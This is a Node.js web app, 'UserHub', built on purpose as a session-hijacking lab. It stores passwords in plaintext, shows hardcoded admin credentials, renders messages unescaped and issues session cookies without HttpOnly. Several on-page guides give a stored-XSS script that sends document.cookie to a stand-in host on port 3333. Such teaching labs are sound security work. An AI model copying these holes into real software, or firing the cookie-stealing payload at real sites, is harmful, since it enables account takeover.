const http = require('http');
const crypto = require('crypto');

// Store users and sessions in memory
const accounts = [
  { id: 1, username: 'admin', password: 'admin123', role: 'admin', email: 'admin@userhub.local' },
  { id: 2, username: 'john', password: 'john123', role: 'user', email: 'john@example.com' }
];
let nextUserId = 3;

const sessions = {}; // sessionId -> { userId, username, role, createdAt }
const messages = []; // Store user messages (vulnerable to XSS)

// Generate session ID
function generateSessionId() {
  return crypto.randomBytes(32).toString('hex');
}

// Parse cookies
function parseCookies(cookieHeader) {
  const cookies = {};
  if (cookieHeader) {
    cookieHeader.split(';').forEach(cookie => {
      const [name, value] = cookie.trim().split('=');
      cookies[name] = value;
    });
  }
  return cookies;
}

// Get current user from session
function getCurrentUser(req) {
  const cookies = parseCookies(req.headers.cookie);
  const sessionId = cookies.sessionId;
  if (sessionId && sessions[sessionId]) {
    return {
      ...sessions[sessionId],
      sessionId: sessionId  // Include session ID in user object
    };
  }
  return null;
}

const server = http.createServer((req, res) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const path = url.pathname;
  const currentUser = getCurrentUser(req);

  // Handle POST requests (for login/register)
  if (req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      const params = new URLSearchParams(body);

      // Handle login
      if (path === '/login') {
        const username = params.get('username');
        const password = params.get('password');
        const user = accounts.find(u => u.username === username && u.password === password);

        if (user) {
          const sessionId = generateSessionId();
          sessions[sessionId] = {
            userId: user.id,
            username: user.username,
            role: user.role,
            createdAt: new Date()
          };

          res.writeHead(302, {
            'Location': '/users',
            'Set-Cookie': `sessionId=${sessionId}; Path=/`
          });
          res.end();
        } else {
          res.writeHead(302, { 'Location': '/login?error=invalid' });
          res.end();
        }
        return;
      }

      // Handle register
      if (path === '/register') {
        const username = params.get('username');
        const password = params.get('password');
        const email = params.get('email');

        if (username && password && email) {
          const existingUser = accounts.find(u => u.username === username);
          if (existingUser) {
            res.writeHead(302, { 'Location': '/register?error=exists' });
            res.end();
            return;
          }

          accounts.push({
            id: nextUserId++,
            username: username,
            password: password,
            role: 'user',
            email: email
          });

          res.writeHead(302, { 'Location': '/login?registered=true' });
          res.end();
        } else {
          res.writeHead(302, { 'Location': '/register?error=invalid' });
          res.end();
        }
        return;
      }

      // Handle message submission
      if (path === '/submit-message') {
        const message = params.get('message');
        if (message && currentUser) {
          messages.push({
            id: messages.length + 1,
            username: currentUser.username,
            role: currentUser.role,
            message: message, // Intentionally NOT sanitized - vulnerable to XSS
            timestamp: new Date()
          });
          res.writeHead(302, { 'Location': '/messages?success=true' });
          res.end();
        } else {
          res.writeHead(302, { 'Location': '/messages?error=true' });
          res.end();
        }
        return;
      }
    });
    return;
  }

  // Logout
  if (path === '/logout') {
    const cookies = parseCookies(req.headers.cookie);
    if (cookies.sessionId) {
      delete sessions[cookies.sessionId];
    }
    res.writeHead(302, {
      'Location': '/',
      'Set-Cookie': 'sessionId=; Path=/; Max-Age=0'
    });
    res.end();
    return;
  }

  // Login page
  if (path === '/login') {
    const error = url.searchParams.get('error');
    const registered = url.searchParams.get('registered');

    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(getLoginPage(error, registered));
    return;
  }

  // Register page
  if (path === '/register') {
    const error = url.searchParams.get('error');

    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(getRegisterPage(error));
    return;
  }

  // Users page (requires login)
  if (path === '/users') {
    if (!currentUser) {
      res.writeHead(302, { 'Location': '/login' });
      res.end();
      return;
    }

    const success = url.searchParams.get('success');
    const error = url.searchParams.get('error');

    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(getUsersPage(currentUser, success, error));
    return;
  }

  // Admin page (requires admin role)
  if (path === '/admin') {
    if (!currentUser) {
      res.writeHead(302, { 'Location': '/login' });
      res.end();
      return;
    }

    if (currentUser.role !== 'admin') {
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(getAccessDeniedPage(currentUser));
      return;
    }

    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(getAdminPage(currentUser));
    return;
  }

  // Messages page (requires login - shared between all users)
  if (path === '/messages') {
    if (!currentUser) {
      res.writeHead(302, { 'Location': '/login' });
      res.end();
      return;
    }

    const success = url.searchParams.get('success');
    const error = url.searchParams.get('error');

    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(getMessagesPage(currentUser, success, error));
    return;
  }

  // Home page
  res.writeHead(200, { 'Content-Type': 'text/html' });
  res.end(getHomePage(currentUser));
});

function getCommonStyles() {
  return `
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      padding: 20px;
    }
    .container {
      max-width: 600px;
      margin: 0 auto;
    }
    .card {
      background: white;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
      margin-bottom: 20px;
    }
    h1 {
      color: #333;
      margin-bottom: 10px;
      text-align: center;
    }
    h2 {
      color: #667eea;
      margin-bottom: 20px;
    }
    .subtitle {
      color: #666;
      text-align: center;
      margin-bottom: 30px;
      font-size: 14px;
    }
    input, select {
      width: 100%;
      padding: 12px;
      border: 2px solid #e0e0e0;
      border-radius: 6px;
      font-size: 14px;
      margin-bottom: 15px;
    }
    input:focus {
      outline: none;
      border-color: #667eea;
    }
    button {
      width: 100%;
      padding: 14px;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-weight: 600;
      font-size: 16px;
    }
    button:hover {
      opacity: 0.9;
    }
    .link {
      display: block;
      text-align: center;
      margin-top: 15px;
      color: #667eea;
      text-decoration: none;
    }
    .link:hover {
      text-decoration: underline;
    }
    .error {
      background: #fee;
      color: #c33;
      padding: 12px;
      border-radius: 6px;
      margin-bottom: 15px;
      text-align: center;
    }
    .success {
      background: #efe;
      color: #3c3;
      padding: 12px;
      border-radius: 6px;
      margin-bottom: 15px;
      text-align: center;
    }
    .warning {
      background: #fff3cd;
      color: #856404;
      padding: 15px;
      border-radius: 6px;
      margin-bottom: 20px;
      font-size: 13px;
      border: 1px solid #ffc107;
    }
    .info {
      background: #e7f3ff;
      color: #0d47a1;
      padding: 15px;
      border-radius: 6px;
      margin-bottom: 20px;
      font-size: 13px;
    }
    .user-badge {
      display: inline-block;
      padding: 4px 12px;
      border-radius: 12px;
      font-size: 12px;
      font-weight: 600;
      background: #e3f2fd;
      color: #1976d2;
    }
    .admin-badge {
      background: #fff3e0;
      color: #f57c00;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 20px;
    }
    th {
      background: #f8f9fa;
      padding: 12px;
      text-align: left;
      font-weight: 600;
      border-bottom: 2px solid #e0e0e0;
    }
    td {
      padding: 12px;
      border-bottom: 1px solid #f0f0f0;
    }
    .nav {
      display: flex;
      gap: 10px;
      margin-bottom: 20px;
    }
    .nav a {
      flex: 1;
      padding: 10px;
      background: rgba(255,255,255,0.2);
      color: white;
      text-align: center;
      text-decoration: none;
      border-radius: 6px;
      font-weight: 600;
    }
    .nav a:hover {
      background: rgba(255,255,255,0.3);
    }
    code {
      background: #f5f5f5;
      padding: 2px 6px;
      border-radius: 3px;
      font-family: monospace;
      font-size: 13px;
    }
  `;
}

function getHomePage(currentUser) {
  return `
<!DOCTYPE html>
<html>
<head>
  <title>UserHub - Home</title>
  <style>${getCommonStyles()}</style>
</head>
<body>
  <div class="container">
    ${currentUser ? `
      <div class="nav">
        <a href="/users">Users</a>
        <a href="/messages">Messages</a>
        <a href="/admin">Admin</a>
        <a href="/logout">Logout</a>
      </div>
    ` : ''}

    <div class="card">
      <h1>🔐 UserHub</h1>
      <div class="subtitle">Session Hijacking Demo</div>

      ${currentUser ? `
        <div class="success">
          Logged in as <strong>${currentUser.username}</strong>
          <span class="user-badge ${currentUser.role === 'admin' ? 'admin-badge' : ''}">${currentUser.role}</span>
        </div>

        <div class="warning">
          <strong>⚠️ Your Session Cookie:</strong><br>
          <code style="word-break: break-all; display: block; margin-top: 8px;">${Object.keys(parseCookies('sessionId=' + Object.keys(sessions).find(sid => sessions[sid].username === currentUser.username)))[0]}</code>
        </div>

        <p style="margin: 20px 0; color: #666;">
          You are logged in! Try navigating to <a href="/users" style="color: #667eea;">/users</a> or <a href="/admin" style="color: #667eea;">/admin</a>.
        </p>

        <p style="margin: 20px 0; color: #666; font-size: 14px;">
          <strong>Demo Session Hijacking:</strong><br>
          If someone steals your session cookie via XSS, they can impersonate you!
          Try copying your cookie and using it in another browser.
        </p>
      ` : `
        <div class="info">
          <strong>🎯 This demo shows session hijacking via XSS</strong><br>
          Login with one of these accounts, then steal the session cookie!
        </div>

        <div style="background: #f8f9fa; padding: 15px; border-radius: 6px; margin-bottom: 20px;">
          <strong>Test Accounts:</strong><br>
          <div style="margin-top: 10px;">
            <code>admin / admin123</code> (Admin)<br>
            <code>john / john123</code> (User)
          </div>
        </div>

        <a href="/login"><button>Login</button></a>
        <a href="/register" class="link">Create new account</a>
      `}
    </div>
  </div>
</body>
</html>
  `;
}

function getLoginPage(error, registered) {
  return `
<!DOCTYPE html>
<html>
<head>
  <title>Login - UserHub</title>
  <style>${getCommonStyles()}</style>
</head>
<body>
  <div class="container">
    <div class="card">
      <h1>🔐 Login</h1>
      <div class="subtitle">Enter your credentials</div>

      ${registered ? '<div class="success">Account created! You can now login.</div>' : ''}
      ${error === 'invalid' ? '<div class="error">Invalid username or password</div>' : ''}

      <div style="background: #f8f9fa; padding: 15px; border-radius: 6px; margin-bottom: 20px;">
        <strong>Test Accounts:</strong><br>
        <div style="margin-top: 10px; font-size: 14px;">
          <code>admin / admin123</code> (Admin)<br>
          <code>john / john123</code> (User)
        </div>
      </div>

      <form method="POST" action="/login">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Login</button>
      </form>

      <a href="/register" class="link">Don't have an account? Register</a>
      <a href="/" class="link">Back to Home</a>
    </div>
  </div>
</body>
</html>
  `;
}

function getRegisterPage(error) {
  return `
<!DOCTYPE html>
<html>
<head>
  <title>Register - UserHub</title>
  <style>${getCommonStyles()}</style>
</head>
<body>
  <div class="container">
    <div class="card">
      <h1>📝 Register</h1>
      <div class="subtitle">Create your account</div>

      ${error === 'exists' ? '<div class="error">Username already exists</div>' : ''}
      ${error === 'invalid' ? '<div class="error">Please fill all fields</div>' : ''}

      <form method="POST" action="/register">
        <input type="text" name="username" placeholder="Username" required>
        <input type="email" name="email" placeholder="Email" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Register</button>
      </form>

      <a href="/login" class="link">Already have an account? Login</a>
      <a href="/" class="link">Back to Home</a>
    </div>
  </div>
</body>
</html>
  `;
}

function getUsersPage(currentUser, success, error) {
  return `
<!DOCTYPE html>
<html>
<head>
  <title>Users - UserHub</title>
  <style>${getCommonStyles()}</style>
</head>
<body>
  <div class="container">
    <div class="nav">
      <a href="/">Home</a>
      <a href="/users">Users</a>
      <a href="/messages">Messages</a>
      <a href="/admin">Admin</a>
      <a href="/logout">Logout</a>
    </div>

    <div class="card">
      <h2>👥 User Directory</h2>

      <div class="info">
        Logged in as: <strong>${currentUser.username}</strong>
        <span class="user-badge ${currentUser.role === 'admin' ? 'admin-badge' : ''}">${currentUser.role}</span>
      </div>

      <table>
        <thead>
          <tr>
            <th>ID</th>
            <th>Username</th>
            <th>Email</th>
            <th>Role</th>
          </tr>
        </thead>
        <tbody>
          ${accounts.map(user => `
            <tr>
              <td>#${user.id}</td>
              <td>${user.username}</td>
              <td>${user.email}</td>
              <td><span class="user-badge ${user.role === 'admin' ? 'admin-badge' : ''}">${user.role}</span></td>
            </tr>
          `).join('')}
        </tbody>
      </table>
    </div>
  </div>

  <script>
    // Set demo cookies for XSS testing
    document.cookie = "userRole=" + "${currentUser.role}" + "; path=/";
    document.cookie = "userId=" + "${currentUser.userId}" + "; path=/";
  </script>
</body>
</html>
  `;
}

function getAdminPage(currentUser) {
  const activeSessions = Object.entries(sessions).map(([sid, session]) => ({
    sessionId: sid,
    ...session
  }));

  return `
<!DOCTYPE html>
<html>
<head>
  <title>Admin Panel - UserHub</title>
  <style>${getCommonStyles()}</style>
</head>
<body>
  <div class="container">
    <div class="nav">
      <a href="/">Home</a>
      <a href="/users">Users</a>
      <a href="/messages">Messages</a>
      <a href="/admin">Admin</a>
      <a href="/logout">Logout</a>
    </div>

    <div class="card">
      <h2>⚙️ Admin Panel</h2>

      <div class="success">
        Welcome Admin <strong>${currentUser.username}</strong>!
      </div>

      <div class="warning">
        <strong>⚠️ Session Hijacking Demo</strong><br>
        Below are all active session IDs. In a real XSS attack, these would be stolen!
      </div>

      <h3 style="margin-top: 25px; color: #333;">Active Sessions (${activeSessions.length})</h3>
      <table>
        <thead>
          <tr>
            <th>Username</th>
            <th>Role</th>
            <th>Session ID</th>
            <th>Created</th>
          </tr>
        </thead>
        <tbody>
          ${activeSessions.map(session => `
            <tr>
              <td>${session.username}</td>
              <td><span class="user-badge ${session.role === 'admin' ? 'admin-badge' : ''}">${session.role}</span></td>
              <td><code style="font-size: 11px;">${session.sessionId.substring(0, 16)}...</code></td>
              <td>${new Date(session.createdAt).toLocaleString('en-GB', { timeZone: 'Europe/Tallinn' })}</td>
            </tr>
          `).join('')}
        </tbody>
      </table>

      <div style="margin-top: 30px; padding: 15px; background: #f8f9fa; border-radius: 6px;">
        <strong>How to test stored XSS:</strong>
        <ol style="margin-top: 10px; padding-left: 20px; color: #666; font-size: 14px;">
          <li>Login as <code>john / john123</code></li>
          <li>Go to <a href="/messages" style="color: #667eea;">/messages</a> and submit: <code>&lt;script&gt;fetch('http://example.com:3333/?stolen='+document.cookie)&lt;/script&gt;</code></li>
          <li>Login as admin and visit <a href="/messages" style="color: #667eea;">/messages</a></li>
          <li>The XSS executes and sends admin's cookies to port 3333!</li>
        </ol>
      </div>
    </div>
  </div>
</body>
</html>
  `;
}

function getAccessDeniedPage(currentUser) {
  return `
<!DOCTYPE html>
<html>
<head>
  <title>Access Denied - UserHub</title>
  <style>${getCommonStyles()}</style>
</head>
<body>
  <div class="container">
    <div class="nav">
      <a href="/">Home</a>
      <a href="/users">Users</a>
      <a href="/messages">Messages</a>
      <a href="/logout">Logout</a>
    </div>

    <div class="card">
      <h2>🚫 Access Denied</h2>

      <div class="error">
        You don't have permission to access this page.<br>
        Your role: <strong>${currentUser.role}</strong>
      </div>

      <p style="margin: 20px 0; color: #666;">
        Only administrators can access the admin panel.
      </p>

      <a href="/users"><button>Back to Users</button></a>
    </div>
  </div>
</body>
</html>
  `;
}

function getMessagesPage(currentUser, success, error) {
  return `
<!DOCTYPE html>
<html>
<head>
  <title>Messages - UserHub</title>
  <style>${getCommonStyles()}</style>
</head>
<body>
  <div class="container">
    <div class="nav">
      <a href="/">Home</a>
      <a href="/users">Users</a>
      <a href="/messages">Messages</a>
      <a href="/admin">Admin</a>
      <a href="/logout">Logout</a>
    </div>

    <div class="card">
      <h2>💬 Messages Board</h2>

      <div class="info">
        Logged in as: <strong>${currentUser.username}</strong>
        <span class="user-badge ${currentUser.role === 'admin' ? 'admin-badge' : ''}">${currentUser.role}</span>
      </div>

      ${success ? '<div class="success">Message posted successfully!</div>' : ''}
      ${error ? '<div class="error">Error posting message</div>' : ''}

      <div class="warning" style="margin-top: 15px;">
        <strong>⚠️ XSS VULNERABILITY:</strong> Messages are NOT sanitized!<br>
        This page is shared by ALL users (admins and regular users).<br>
        Try: <code>&lt;script&gt;fetch('http://example.com:3333/?c='+document.cookie)&lt;/script&gt;</code>
      </div>
    </div>

    <div class="card">
      <h2>📝 Post a Message</h2>
      <form method="POST" action="/submit-message">
        <textarea name="message" placeholder="Enter your message (XSS payloads will execute!)..." style="width: 100%; min-height: 120px; padding: 12px; border: 2px solid #e0e0e0; border-radius: 6px; font-family: inherit; margin-bottom: 15px; resize: vertical;" required></textarea>
        <button type="submit">Post Message</button>
      </form>
    </div>

    <div class="card">
      <h2>📬 All Messages (${messages.length})</h2>

      ${messages.length > 0 ? `
        <div style="max-height: 500px; overflow-y: auto;">
          ${messages.map(msg => `
            <div style="background: ${msg.role === 'admin' ? '#fff3e0' : '#e7f3ff'}; padding: 15px; border-radius: 6px; margin-bottom: 12px; border-left: 4px solid ${msg.role === 'admin' ? '#f57c00' : '#1976d2'};">
              <div style="display: flex; justify-content: space-between; margin-bottom: 10px; align-items: center;">
                <div>
                  <strong style="color: #333;">${msg.username}</strong>
                  <span class="user-badge ${msg.role === 'admin' ? 'admin-badge' : ''}">${msg.role}</span>
                </div>
                <span style="color: #999; font-size: 12px;">${new Date(msg.timestamp).toLocaleString('en-GB', { timeZone: 'Europe/Tallinn' })}</span>
              </div>
              <div style="color: #333; word-break: break-word; line-height: 1.5;">${msg.message}</div>
            </div>
          `).join('')}
        </div>
      ` : `
        <p style="color: #999; text-align: center; padding: 30px;">No messages yet. Be the first to post!</p>
      `}
    </div>

    <div class="card" style="background: #f8f9fa;">
      <h3 style="color: #333; margin-bottom: 15px;">💡 How to Test Stored XSS</h3>
      <ol style="padding-left: 20px; color: #666; font-size: 14px; line-height: 1.8;">
        <li>Login as <code>john / john123</code> (regular user)</li>
        <li>Post this message: <code style="display: block; margin: 8px 0; background: white; padding: 8px; border-radius: 4px;">&lt;script&gt;fetch('http://example.com:3333/?victim='+document.cookie)&lt;/script&gt;</code></li>
        <li>Login as <code>admin / admin123</code> in another browser/tab</li>
        <li>Visit <strong>/messages</strong> page as admin</li>
        <li>The XSS payload executes and sends admin's session cookie to port 3333!</li>
        <li>Check <a href="http://example.com:3333" target="_blank" style="color: #667eea;">port 3333</a> to see the stolen cookie</li>
      </ol>
    </div>
  </div>

  <script>
    // Set demo cookies for XSS testing
    document.cookie = "userRole=" + "${currentUser.role}" + "; path=/";
    document.cookie = "userId=" + "${currentUser.userId}" + "; path=/";
  </script>
</body>
</html>
  `;
}

server.listen(3335, '0.0.0.0', () => {
  console.log('UserHub with Authentication running on http://0.0.0.0:3335');
  console.log('Intentionally vulnerable for session hijacking demo');
  console.log('Test accounts: admin/admin123 (admin), john/john123 (user)');
});
